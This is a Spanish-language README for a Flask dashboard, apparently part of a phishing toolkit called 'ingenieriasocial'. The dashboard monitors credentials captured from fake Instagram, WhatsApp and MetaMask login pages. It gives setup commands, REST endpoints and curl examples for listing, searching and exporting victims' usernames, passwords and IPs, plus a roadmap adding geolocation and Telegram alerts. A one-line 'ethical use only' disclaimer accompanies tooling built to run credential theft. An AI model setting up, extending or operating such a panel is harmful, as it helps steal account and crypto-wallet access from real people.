# 🎯 Dashboard Web - ingenieriasocial

## Creado por: MidasOrion

Panel de control profesional en tiempo real para monitorear campañas de phishing.

---

## ✨ Características

### **📊 Estadísticas en Tiempo Real**
- Total de capturas
- Capturas del día
- Plataformas activas
- IPs únicas
- Auto-refresh cada 10 segundos

### **📋 Tabla de Capturas**
- Últimas 20 capturas
- Filtrado por plataforma
- Información detallada (IP, timestamp, credenciales)
- Badges de colores por plataforma

### **🌐 Análisis por Plataforma**
- Instagram
- WhatsApp
- MetaMask
- Contador de capturas por plataforma

### **📤 Exportación de Datos**
- JSON (formato estructurado)
- CSV (para Excel)
- TXT (formato legible)

### **🔌 API REST Completa**
- `/api/stats` - Estadísticas generales
- `/api/captures` - Todas las capturas
- `/api/captures/<platform>` - Capturas por plataforma
- `/api/export/<format>` - Exportar datos
- `/api/search?q=<query>` - Buscar en capturas
- `/api/platforms` - Lista de plataformas

---

## 🚀 Instalación

### **Requisitos:**
- Python 3.7+
- Flask
- Flask-CORS

### **Instalación automática:**

```bash
./start_dashboard.sh
```

### **Instalación manual:**

```bash
# Instalar dependencias
pip3 install flask flask-cors

# Ir al directorio del dashboard
cd src/dashboard

# Iniciar servidor
python3 dashboard.py
```

---

## 💻 Uso

### **Iniciar el Dashboard:**

```bash
./start_dashboard.sh
```

### **Acceder:**

Abre tu navegador en:
- **Dashboard:** http://localhost:5000
- **API:** http://localhost:5000/api/stats

### **Exportar Datos:**

Desde el dashboard:
1. Click en "Exportar JSON" o "Exportar CSV"
2. El archivo se descargará automáticamente

Desde la API:
```bash
curl http://localhost:5000/api/export/json
curl http://localhost:5000/api/export/csv
curl http://localhost:5000/api/export/txt
```

### **Buscar en Capturas:**

```bash
curl "http://localhost:5000/api/search?q=192.168"
```

---

## 📸 Capturas de Pantalla

### Dashboard Principal:
- Tarjetas de estadísticas con iconos
- Tabla de capturas recientes
- Lista de plataformas activas
- Diseño moderno con gradientes

### Características Visuales:
- 🎨 Diseño moderno con gradientes morados
- 📱 Responsive (funciona en móvil)
- ⚡ Animaciones suaves
- 🔄 Auto-refresh automático
- 💫 Efectos hover

---

## 🔧 Configuración

### **Cambiar Puerto:**

Edita `dashboard.py`:
```python
app.run(host='0.0.0.0', port=5000, debug=True)
```

### **Cambiar Ruta de Templates:**

Edita `dashboard.py`:
```python
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates', 'phishing')
```

### **Habilitar HTTPS:**

```python
app.run(host='0.0.0.0', port=5000, ssl_context='adhoc')
```

---

## 📊 Estructura de Datos

### **Formato de Captura:**

```json
{
  "platform": "Instagram",
  "timestamp": "2025-10-20 10:00:00",
  "username": "victim@email.com",
  "password": "********",
  "ip": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "referer": "https://..."
}
```

---

## 🔌 API Endpoints

### **GET /api/stats**
Obtener estadísticas generales

**Respuesta:**
```json
{
  "total_captures": 42,
  "platforms": {
    "Instagram": 20,
    "WhatsApp": 15,
    "MetaMask": 7
  },
  "today_captures": 5,
  "top_ips": [
    {"ip": "192.168.1.100", "count": 3}
  ]
}
```

### **GET /api/captures**
Obtener todas las capturas

**Respuesta:**
```json
{
  "success": true,
  "count": 42,
  "captures": [...]
}
```

### **GET /api/captures/<platform>**
Obtener capturas de una plataforma específica

**Ejemplo:**
```bash
curl http://localhost:5000/api/captures/instagram
```

### **GET /api/export/<format>**
Exportar datos en diferentes formatos

**Formatos disponibles:**
- `json` - JSON estructurado
- `csv` - CSV para Excel
- `txt` - Texto plano

**Ejemplo:**
```bash
curl http://localhost:5000/api/export/json > captures.json
```

### **GET /api/search?q=<query>**
Buscar en todas las capturas

**Ejemplo:**
```bash
curl "http://localhost:5000/api/search?q=gmail"
```

---

## 🛡️ Seguridad

### **Recomendaciones:**

1. **No exponer públicamente** - Solo usar en red local
2. **Usar HTTPS** en producción
3. **Agregar autenticación** para acceso remoto
4. **Firewall** - Bloquear puerto 5000 desde internet
5. **VPN** - Acceder solo a través de VPN

### **Agregar Autenticación Básica:**

```python
from flask_httpauth import HTTPBasicAuth

auth = HTTPBasicAuth()

@auth.verify_password
def verify_password(username, password):
    if username == 'admin' and password == 'tu_password':
        return username

@app.route('/')
@auth.login_required
def index():
    return render_template('dashboard.html')
```

---

## 🐛 Troubleshooting

### **Error: Flask no instalado**
```bash
pip3 install flask flask-cors
```

### **Error: Puerto 5000 en uso**
Cambiar puerto en `dashboard.py` o matar proceso:
```bash
lsof -ti:5000 | xargs kill -9
```

### **Error: No se muestran capturas**
Verificar que existan archivos `captured_credentials.json` en:
```
src/templates/phishing/*/captured_credentials.json
```

---

## 📝 TODO

- [ ] Gráficos con Chart.js
- [ ] Mapa de ubicaciones por IP
- [ ] Notificaciones push en tiempo real
- [ ] Filtros avanzados
- [ ] Exportación a PDF
- [ ] Sistema de alertas
- [ ] Integración con Telegram/Discord
- [ ] Multi-usuario con roles

---

## 🤝 Contribuciones

Para agregar nuevas características:

1. Fork el repositorio
2. Crear branch: `git checkout -b feature/nueva-caracteristica`
3. Commit: `git commit -m 'Agregar nueva característica'`
4. Push: `git push origin feature/nueva-caracteristica`
5. Pull Request

---

## 📄 Licencia

Este dashboard es parte de **ingenieriasocial** por MidasOrion.

**Uso ético y educativo solamente.**

---

## 📞 Soporte

- GitHub: https://github.com/CoderFullPro/ingieriasocial
- Creador: MidasOrion

---

**© 2025 ingenieriasocial - Dashboard Web**

*Recuerda: Usa esta herramienta de forma ética y responsable.*
